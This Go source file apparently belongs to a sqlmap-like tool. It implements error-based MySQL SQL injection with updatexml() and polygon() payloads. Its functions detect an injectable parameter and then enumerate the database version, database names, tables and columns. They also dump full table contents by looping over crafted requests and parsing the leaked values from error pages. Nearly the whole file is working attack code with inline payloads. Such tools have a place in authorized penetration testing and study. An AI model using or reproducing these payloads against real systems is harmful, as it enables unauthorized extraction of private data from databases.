package core

import (
	"github.com/EmYiQing/go-sqlmap/log"
	"github.com/EmYiQing/go-sqlmap/str"
	"github.com/EmYiQing/go-sqlmap/util"
	"regexp"
	"strconv"
	"strings"
)

// DetectErrorBased 检测是否存在报错注入
func DetectErrorBased(target string, suffixList []string) (bool, string) {
	for _, suffix := range suffixList {
		finalPayload := target + suffix + str.Space + "Or" + str.Space +
			str.UpdatexmlFunc + str.Space + str.Annotator
		code, _, tempBody := util.Request(str.RequestMethod,
			finalPayload, nil, nil)
		if code != -1 {
			if strings.Contains(strings.ToLower(string(tempBody)),
				strings.ToLower(str.ErrorBasedKeyword)) {
				return true, suffix
			}
		}
	}
	return false, ""
}

// GetVersionByErrorBased 报错注入方式得到版本
func GetVersionByErrorBased(target string, suffix string) {
	code, _, tempBody := util.Request(str.RequestMethod,
		target+suffix+str.UpdatexmlVersionPayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(str.UpdatexmlErrorKeyword)) {
			re := regexp.MustCompile(str.UpdatexmlRegex)
			res := re.FindAllStringSubmatch(body, -1)
			if strings.TrimSpace(res[0][1]) != "" {
				log.Info("mysql version:" + res[0][1])
			}
		}
	}
}

// GetCurrentDatabaseByErrorBased 报错注入方式得到当前数据库名
func GetCurrentDatabaseByErrorBased(target string, suffix string) {
	code, _, tempBody := util.Request(str.RequestMethod,
		target+suffix+str.UpdatexmlDatabasePayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(str.UpdatexmlErrorKeyword)) {
			re := regexp.MustCompile(str.UpdatexmlRegex)
			res := re.FindAllStringSubmatch(body, -1)
			if strings.TrimSpace(res[0][1]) != "" {
				log.Info("current database:" + res[0][1])
			}
		}
	}
}

// GetAllDatabasesByErrorBased 报错注入方式得到所有数据库名
func GetAllDatabasesByErrorBased(target string, suffix string) {
	var databases string
	for i := 0; ; i++ {
		payload := target + suffix + "%20and%20updatexml(2,concat(0x7e,(select%20schema_name%20" +
			"from%20information_schema.schemata%20limit%20" + strconv.Itoa(i) + ",1),0x7e),1)--+"
		code, _, tempBody := util.Request(str.RequestMethod,
			payload, nil, nil)
		if code != -1 {
			body := string(tempBody)
			if strings.Contains(strings.ToLower(body),
				strings.ToLower(str.UpdatexmlErrorKeyword)) {
				re := regexp.MustCompile(str.UpdatexmlRegex)
				res := re.FindAllStringSubmatch(body, -1)
				if strings.TrimSpace(res[0][1]) != "" {
					databases = databases + res[0][1] + ","
				}
			} else {
				break
			}
		}
	}
	log.Info("get databases success")
	data := util.DeleteLastChar(strings.TrimSpace(databases))
	util.PrintDatabases(util.ConvertString(data))
}

// GetAllTablesByErrorBased 报错注入根据数据库名获得所有表名
func GetAllTablesByErrorBased(target string, suffix string, database string) {
	var tables string
	for i := 0; ; i++ {
		payload := target + suffix + "%20and%20updatexml(2,concat(0x7e,(select%20table_name%20" +
			"from%20information_schema.tables%20where%20table_schema='" + database +
			"'%20limit%20" + strconv.Itoa(i) + ",1),0x7e),1)--+"
		code, _, tempBody := util.Request(str.RequestMethod,
			payload, nil, nil)
		if code != -1 {
			body := string(tempBody)
			if strings.Contains(strings.ToLower(body),
				strings.ToLower(str.UpdatexmlErrorKeyword)) {
				re := regexp.MustCompile(str.UpdatexmlRegex)
				res := re.FindAllStringSubmatch(body, -1)
				if strings.TrimSpace(res[0][1]) != "" {
					tables = tables + res[0][1] + ","
				}
			} else {
				break
			}
		}
	}
	log.Info("get tables success")
	data := util.DeleteLastChar(strings.TrimSpace(tables))
	util.PrintTables(util.ConvertString(data))
}

// GetAllColumnsByErrorBased 报错注入根据数据库名和表名获得所有字段
func GetAllColumnsByErrorBased(target string, suffix string, database string, table string) {
	var columns string
	for i := 0; ; i++ {
		payload := target + suffix + "%20and%20updatexml(2,concat(0x7e,(select%20column_name%20" +
			"from%20information_schema.columns%20where%20table_name='" + table +
			"'%20and%20table_schema='" + database + "'%20limit%20" + strconv.Itoa(i) + ",1),0x7e),1)--+"
		code, _, tempBody := util.Request(str.RequestMethod,
			payload, nil, nil)
		if code != -1 {
			body := string(tempBody)
			if strings.Contains(strings.ToLower(body),
				strings.ToLower(str.UpdatexmlErrorKeyword)) {
				re := regexp.MustCompile(str.UpdatexmlRegex)
				res := re.FindAllStringSubmatch(body, -1)
				if strings.TrimSpace(res[0][1]) != "" {
					columns = columns + res[0][1] + ","
				}
			} else {
				break
			}
		}
	}
	log.Info("get columns success")
	data := util.DeleteLastChar(strings.TrimSpace(columns))
	util.PrintTables(util.ConvertString(data))
}

// GetAllDataByErrorBased 报错注入根据输入获得所有数据
func GetAllDataByErrorBased(target string, suffix string, database string, table string, columns []string) {
	var data string
	tempPayload := "concat("
	for _, v := range columns {
		tempPayload = tempPayload + v + ",0x3a,"
	}
	r := []rune(tempPayload)
	innerPayload := string(r[:len(r)-6])
	innerPayload += ")"
	for i := 0; ; i++ {
		payload := target + suffix + "%20and%20updatexml(2,concat(0x7e,(select%20" +
			innerPayload + "%20from%20" + database + "." + table + "%20limit%20" +
			strconv.Itoa(i) + ",1),0x7e),1)--+"
		code, _, tempBody := util.Request(str.RequestMethod,
			payload, nil, nil)
		if code != -1 {
			body := string(tempBody)
			if strings.Contains(strings.ToLower(body),
				strings.ToLower(str.UpdatexmlErrorKeyword)) {
				re := regexp.MustCompile(str.UpdatexmlRegex)
				res := re.FindAllStringSubmatch(body, -1)
				if strings.TrimSpace(res[0][1]) != "" {
					data = data + res[0][1] + ","
				}
			} else {
				break
			}
		}
	}
	log.Info("get data success")
	data = util.DeleteLastChar(strings.TrimSpace(data))
	var output [][]string
	for _, v := range strings.Split(data, ",") {
		var temp []string
		params := strings.Split(v, ":")
		for _, innerV := range params {
			temp = append(temp, innerV)
		}
		output = append(output, temp)
	}
	util.PrintData(util.ConvertInterfaceArray(columns, output))
}

// GetVersionByErrorBasedPolygon 报错注入方式得到版本
func GetVersionByErrorBasedPolygon(target string, suffix string) {
	code, _, tempBody := util.Request(str.RequestMethod,
		target+suffix+str.PolygonVersionPayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(str.PolygonErrorKeyword)) {
			re := regexp.MustCompile(str.PolygonVersionRegex)
			res := re.FindAllStringSubmatch(body, -1)
			log.Info("mysql version:" + res[0][1])
		}
	}
}

// GetCurrentDatabaseByErrorBasedPolygon 报错注入方式得到当前数据库名
func GetCurrentDatabaseByErrorBasedPolygon(target string, suffix string) {
	code, _, tempBody := util.Request(str.RequestMethod,
		target+suffix+str.PolygonDatabasePayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(str.PolygonErrorKeyword)) {
			re := regexp.MustCompile(str.PolygonDatabaseRegex)
			res := re.FindAllStringSubmatch(body, -1)
			log.Info("current database:" + res[0][1])
		}
	}
}

// GetAllDatabasesByErrorBasedPolygon 报错注入方式得到所有数据库名
func GetAllDatabasesByErrorBasedPolygon(target string, suffix string) {
	code, _, tempBody := util.Request(str.RequestMethod,
		target+suffix+str.PolygonAllDatabasesPayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(str.PolygonErrorKeyword)) {
			re := regexp.MustCompile(str.PolygonDataRegex)
			res := re.FindAllStringSubmatch(body, -1)
			log.Info("get databases success")
			util.PrintDatabases(util.ConvertString(res[0][1]))
		}
	}
}

// GetAllTablesByErrorBasedPolygon 报错注入根据数据库名获得所有表名
func GetAllTablesByErrorBasedPolygon(target string, suffix string, database string) {
	payload := target + suffix + str.Space + "Or" + str.Space +
		"polygon((select%20*%20from(select%20*%20from(select%20" +
		"group_concat(table_name)%20from%20information_schema." +
		"tables%20where%20table_schema='" + database + "')a)b))--+"
	code, _, tempBody := util.Request(str.RequestMethod, payload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(str.PolygonErrorKeyword)) {
			re := regexp.MustCompile(str.PolygonDataRegex)
			res := re.FindAllStringSubmatch(body, -1)
			log.Info("get tables success")
			util.PrintTables(util.ConvertString(res[0][1]))
		}
	}
}

// GetAllColumnsByErrorBasedPolygon 报错注入根据数据库名和表名获得所有字段
func GetAllColumnsByErrorBasedPolygon(target string, suffix string, database string, table string) {
	payload := target + suffix + str.Space + "Or" + str.Space +
		"polygon((select%20*%20from(select%20*%20from(select%20" +
		"group_concat(column_name)%20from%20information_schema." +
		"columns%20where%20table_name='" + table +
		"'%20and%20table_schema='" + database + "')a)b))--+"
	code, _, tempBody := util.Request(str.RequestMethod, payload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(str.PolygonErrorKeyword)) {
			re := regexp.MustCompile(str.PolygonDataRegex)
			res := re.FindAllStringSubmatch(body, -1)
			log.Info("get columns success")
			util.PrintColumns(util.ConvertString(res[0][1]))
		}
	}
}

// GetAllDataByErrorBasedPolygon 报错注入根据输入获得所有数据
func GetAllDataByErrorBasedPolygon(target string, suffix string, database string, table string, columns []string) {
	start := target + suffix + str.Space + "Or" + str.Space +
		"polygon((select%20*%20from(select%20*%20from(select%20concat("
	var tempPayload string
	for _, v := range columns {
		tempPayload = tempPayload + v + ",0x3a,"
	}
	r := []rune(tempPayload)
	result := string(r[:len(r)-6])
	var data []string
	for i := 0; ; i++ {
		payload := start + result + ")%20from%20" + database + "." + table +
			"%20limit%20+" + strconv.Itoa(i) + ",1)a)b))--+"
		code, _, tempBody := util.Request(str.RequestMethod, payload, nil, nil)
		if code != -1 {
			body := string(tempBody)
			if strings.Contains(strings.ToLower(body),
				strings.ToLower(str.PolygonErrorKeyword)) {
				re := regexp.MustCompile(str.PolygonFinalDataRegex)
				res := re.FindAllStringSubmatch(body, -1)
				if res != nil {
					data = append(data, res[0][1])
				} else {
					break
				}
			} else {
				break
			}
		}
	}
	log.Info("get data success")
	var output [][]string
	for _, v := range data {
		var temp []string
		params := strings.Split(v, ":")
		for _, innerV := range params {
			temp = append(temp, innerV)
		}
		output = append(output, temp)
	}
	util.PrintData(util.ConvertInterfaceArray(columns, output))
}
